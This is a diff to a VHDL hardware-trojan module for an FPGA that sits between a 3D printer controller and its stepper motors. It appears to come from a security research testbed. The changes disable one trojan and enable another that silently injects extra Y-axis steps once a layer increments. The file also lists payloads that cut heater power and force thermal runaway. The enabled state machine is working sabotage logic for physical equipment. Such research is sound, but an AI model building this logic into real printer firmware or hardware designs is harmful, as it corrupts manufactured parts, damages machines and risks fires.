@@ -112,8 +112,8 @@ architecture Behavioral of Trojan_TOP is
     -- Temporarily we will set the enabled trojans here, hardcoded. Vivado will optimize out the unused ones.
     signal TROJ_T1_ENABLE : std_logic := '0'; -- Adds steps from X or Y axis during move
     signal TROJ_T2_ENABLE : std_logic := '0'; -- Constant over / under extrusion per print
-    signal TROJ_T3_ENABLE : std_logic := '1'; -- Increases or decreases filament retraction between layers
-    signal TROJ_T4_ENABLE : std_logic := '0'; -- Small Shift along X and Y axis on random Z layer increment
+    signal TROJ_T3_ENABLE : std_logic := '0'; -- Increases or decreases filament retraction between layers
+    signal TROJ_T4_ENABLE : std_logic := '1'; -- Small Shift along X and Y axis on random Z layer increment
     signal TROJ_T5_ENABLE : std_logic := '0'; -- Denial of service via disabling D8/D10 heating element power
     signal TROJ_T6_ENABLE : std_logic := '0'; -- Forcing thermal runaway and further overheating
     signal TROJ_T7_ENABLE : std_logic := '0'; -- Layer Delamination via Z-layer shift
@@ -139,7 +139,7 @@ architecture Behavioral of Trojan_TOP is
     
     -- Trojan 4 Related Signals 
     signal T4_STATE, T4_NEXT_STATE: State_Type := IDLE;
-    signal TROJ_T4_Z_PULSE_COUNT : std_logic_vector (7 downto 0) := (others=>'0');  
+    signal TROJ_T4_Z_PULSE_COUNT : std_logic_vector (9 downto 0) := (others=>'0');  
     
     -- Trojan 5 Related Signals 
     signal T5_STATE, T5_NEXT_STATE: State_Type := IDLE;
@@ -209,7 +209,7 @@ begin
 
     o_E_DIR    <= i_E_DIR ;
     o_E_EN     <= i_E_EN  ;
---    o_E_STEP   <= i_E_STEP;   
+    o_E_STEP   <= i_E_STEP;   
 
     o_X_DIR     <= i_X_DIR  ;
     o_X_EN      <= i_X_EN   ;   
@@ -219,7 +219,7 @@ begin
     o_Y_DIR     <= i_Y_DIR  ;
     o_Y_EN      <= i_Y_EN   ;
     o_Y_MIN     <= i_Y_MIN  ;
-    o_Y_STEP    <= i_Y_STEP ; 
+--    o_Y_STEP    <= i_Y_STEP ; 
 
     o_Z_DIR     <= i_Z_DIR  ;
     o_Z_EN      <= i_Z_EN   ;
@@ -234,10 +234,10 @@ begin
     -- o_E_STEP   <= i_E_STEP when TROJ_T2_ENABLE = '0' else (i_E_STEP and TROJ_T2_MATCH_INPUT);
     
     -- Trojan 3 Related Signals 
-     o_E_STEP   <= i_E_STEP when TROJ_T3_ENABLE = '0' else (i_E_STEP or E_STEP_MOD);   
+--     o_E_STEP   <= i_E_STEP when TROJ_T3_ENABLE = '0' else (i_E_STEP or E_STEP_MOD);   
         
     -- Trojan 4 Related Signals 
-    -- o_Y_STEP    <= i_Y_STEP when TROJ_T4_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);
+     o_Y_STEP    <= i_Y_STEP when TROJ_T4_ENABLE = '0' else (i_Y_STEP or Y_STEP_MOD);
     
     -- -- Trojan 5 Related Signals 
     -- o_D10       <= o_D10 when TROJ_T5_ENABLE = '0' else (o_D10 or TROJ_T5_D10_MOD);
@@ -262,53 +262,53 @@ begin
 
     ------------------------- Trojan 1 Logic Start ---------------------------
     -- This trojan adds or removes steps from the X and Y Axis 
-    trojan_t1_proc : process (i_CLK)
-    begin
-        if rising_edge(i_CLK) then
-            T1_STATE <= T1_NEXT_STATE;
-            case T1_STATE is
-                when IDLE =>
-                    if (TROJ_T1_ENABLE = '1' and homing_complete = '1') then
-                        T1_NEXT_STATE <= STATE_1;
-                    else
-                        T1_NEXT_STATE <= DISABLE;
-                    end if;
+--    trojan_t1_proc : process (i_CLK)
+--    begin
+--        if rising_edge(i_CLK) then
+--            T1_STATE <= T1_NEXT_STATE;
+--            case T1_STATE is
+--                when IDLE =>
+--                    if (TROJ_T1_ENABLE = '1' and homing_complete = '1') then
+--                        T1_NEXT_STATE <= STATE_1;
+--                    else
+--                        T1_NEXT_STATE <= DISABLE;
+--                    end if;
 
-                when STATE_1 => -- Counter Enable
-                    if(TROJ_T1_COUNTER = TEN_SECONDS) then
-                        TROJ_T1_COUNTER <= (others=>'0');
-                        T1_NEXT_STATE <= STATE_2;
-                    else 
-                        TROJ_T1_COUNTER <= TROJ_T1_COUNTER + 1;
-                    end if;
+--                when STATE_1 => -- Counter Enable
+--                    if(TROJ_T1_COUNTER = TEN_SECONDS) then
+--                        TROJ_T1_COUNTER <= (others=>'0');
+--                        T1_NEXT_STATE <= STATE_2;
+--                    else 
+--                        TROJ_T1_COUNTER <= TROJ_T1_COUNTER + 1;
+--                    end if;
 
-                when STATE_2 => -- Send Steps to motor X
-                    if(X_STEP_COMPLETE = '1') then
-                        X_PULSE_EN <= '0';
-                        T1_NEXT_STATE <= STATE_3;
-                    else 
-                        X_PULSE_EN <= '1'; -- We may need an extra state to turn this off nect state .. Turning it off after completion may cause two steps
-                    end if;
+--                when STATE_2 => -- Send Steps to motor X
+--                    if(X_STEP_COMPLETE = '1') then
+--                        X_PULSE_EN <= '0';
+--                        T1_NEXT_STATE <= STATE_3;
+--                    else 
+--                        X_PULSE_EN <= '1'; -- We may need an extra state to turn this off nect state .. Turning it off after completion may cause two steps
+--                    end if;
                         
-                when STATE_3 => -- Send Steps to motor Y
-                    if(Y_STEP_COMPLETE = '1') then
-                        Y_PULSE_EN <= '0';
-                        T1_NEXT_STATE <= IDLE;
-                    else 
-                        Y_PULSE_EN <= '1';
-                    end if;
+--                when STATE_3 => -- Send Steps to motor Y
+--                    if(Y_STEP_COMPLETE = '1') then
+--                        Y_PULSE_EN <= '0';
+--                        T1_NEXT_STATE <= IDLE;
+--                    else 
+--                        Y_PULSE_EN <= '1';
+--                    end if;
 
-                when STATE_4 => T1_NEXT_STATE <= DISABLE; -- Unused
-                when STATE_5 => T1_NEXT_STATE <= DISABLE; -- Unused
+--                when STATE_4 => T1_NEXT_STATE <= DISABLE; -- Unused
+--                when STATE_5 => T1_NEXT_STATE <= DISABLE; -- Unused
         
-                when DISABLE => -- Turn off signals here
-                    TROJ_T1_COUNTER <= (others=>'0');
-                    X_PULSE_EN <= '0';
-                    Y_PULSE_EN <= '0';
-                    T1_NEXT_STATE <= IDLE;
-            end case;
-        end if;
-    end process;
+--                when DISABLE => -- Turn off signals here
+--                    TROJ_T1_COUNTER <= (others=>'0');
+--                    X_PULSE_EN <= '0';
+--                    Y_PULSE_EN <= '0';
+--                    T1_NEXT_STATE <= IDLE;
+--            end case;
+--        end if;
+--    end process;
     ------------------------- Trojan 1 Logic End ---------------------------
 
 
@@ -401,7 +401,7 @@ begin
 
 
     ------------------------- Trojan 4 Logic Start ---------------------------
-    -- This trojan adds or removes steps from the X and Y Axis on layer increment
+    -- This trojan adds steps to  Y Axis on layer increment
     trojan_t4_proc : process (i_CLK)
     begin
         if rising_edge(i_CLK) then
@@ -415,8 +415,8 @@ begin
                     end if;
 
                 when STATE_1 => -- Wait for a certain number of z steps
-                    if (TROJ_T4_Z_PULSE_COUNT = X"FF") then -- 255 pulses --> 
-                        TROJ_T4_Z_PULSE_COUNT <= X"00";
+                    if (TROJ_T4_Z_PULSE_COUNT = "1100100000") then -- 800  pulses -->  layer 10
+                        TROJ_T4_Z_PULSE_COUNT <= "0000000000";
                         T4_NEXT_STATE <= STATE_2;
                     else 
                         if(Z_STEP_EDGE = '1') then
